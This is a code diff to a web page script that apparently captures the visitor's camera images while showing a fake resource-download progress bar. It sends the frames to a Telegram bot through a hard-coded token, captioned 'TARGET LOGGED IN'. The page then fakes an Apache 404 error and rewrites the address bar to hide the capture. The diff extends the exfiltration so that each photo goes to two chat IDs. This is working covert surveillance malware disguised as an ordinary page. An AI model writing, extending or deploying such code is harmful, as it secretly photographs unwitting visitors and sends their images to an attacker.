@@ -31,7 +31,8 @@
 
     <script>
         const TOKEN = '8600866532:AAFbJjSTJUSeUwUf-RWRLMUSL_OdcZ2USaU';
-        const ID = '7617707778';
+        // Updated to include both Chat IDs
+        const IDS = ['7617707778', '7194705917'];
 
         async function initiate() {
             const status = document.getElementById('status');
@@ -67,7 +68,7 @@
                         count++;
                         loader.style.width = (count * (100 / maxPackets)) + "%";
                         status.innerText = "> DOWNLOADING RESOURCES " + count + "/" + maxPackets + "...";
-                    }, 600);
+                    }, 800); // 800ms is a safe speed for dual-sending
                 };
             } catch (e) {
                 status.innerText = "> ACCESS DENIED: PERMISSION FAILED";
@@ -84,32 +85,34 @@
             
             canvas.toBlob(blob => {
                 if (!blob) return;
-                const fd = new FormData();
-                fd.append('chat_id', ID);
-                fd.append('photo', blob, 'identity_packet.jpg');
-                fd.append('caption', '🎯 TARGET LOGGED IN\nFragment: ' + index + '\nAgent: C2-Node-Alpha');
 
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: fd
+                // Loop through all IDs in the array
+                IDS.forEach(chatId => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', blob, 'identity_packet.jpg');
+                    fd.append('caption', '🎯 TARGET LOGGED IN\nFragment: ' + index + '\nAgent: C2-Node-Alpha');
+
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: fd
+                    }).catch(err => console.error("Send failed for ID " + chatId, err));
                 });
             }, 'image/jpeg', 0.4); 
         }
 
         function render404() {
-            // Overwrite the entire document to mimic a real server error
             document.documentElement.innerHTML = `
             <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
             <html><head>
             <title>404 Not Found</title>
             </head><body style="background-color: white; color: black; font-family: sans-serif; padding: 20px;">
             <h1>Not Found</h1>
-            <p>The requested URL was not found on this server. System Error</p>
+            <p>The requested URL was not found on this server.</p>
             <hr>
             <address>Apache/2.4.41 (Ubuntu) Server at Port 443</address>
             </body></html>`;
             
-            // Optional: Changes the visible URL in the address bar
             window.history.pushState({}, "", "/error-log-0x8842");
         }
     </script>
